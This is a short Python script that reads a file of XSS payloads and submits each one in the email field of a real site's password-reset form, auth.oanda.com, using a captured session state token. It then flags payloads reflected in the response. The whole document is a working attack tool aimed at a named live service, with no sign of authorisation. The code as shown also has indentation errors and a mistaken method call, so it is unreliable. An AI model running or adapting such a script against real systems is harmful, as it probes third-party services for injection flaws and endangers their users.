import requests
from termcolor import colored as cl
import os

os.system('clear')

payloads = open('/home/luffy/Desktop/pentest/tools/web_tools/payloads/xss.txt', 'r').read().split('\n')

def brute(pay):
    headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://auth.oanda.com/u/reset-password/request/fx-users?state=hKFo2SBpYlE2TUxQWU9KQjI5VG1VWVJUbjRQNk5LUTRxNWRMZqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGc1MEU2ZUxvMFJWVGplQzY2eE5PS0xrOHpwX2Y4SHVoo2NpZNkgNVJNWFBObmhEc0doemlLMmllRGZKajRKelpKWXdEcnQ&ui_locales=en',
    'Origin': 'https://auth.oanda.com',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    }
    
    params = {
    'state': 'hKFo2SBpYlE2TUxQWU9KQjI5VG1VWVJUbjRQNk5LUTRxNWRMZqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGc1MEU2ZUxvMFJWVGplQzY2eE5PS0xrOHpwX2Y4SHVoo2NpZNkgNVJNWFBObmhEc0doemlLMmllRGZKajRKelpKWXdEcnQ',
    'ui_locales': 'en',
    }
    
    data = {
    'state': 'hKFo2SBpYlE2TUxQWU9KQjI5VG1VWVJUbjRQNk5LUTRxNWRMZqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGc1MEU2ZUxvMFJWVGplQzY2eE5PS0xrOHpwX2Y4SHVoo2NpZNkgNVJNWFBObmhEc0doemlLMmllRGZKajRKelpKWXdEcnQ',
     'email': f'{pay}@email.com',
     'action': 'default',
     }
     
     req=requests.post('https://auth.oanda.com/u/reset-password/request/fx-users', params=params, headers=headers, data=data).text()
     
     if pay in req:
         print(cl(f"Check ====> {pay}", color='green'))
         print("")
     else:
         print(cl(f"Not Working ====> {pay}", color='red'))

try:
    for pay in payloads:
        brute(pay)
except Exception as e:
    print(e)
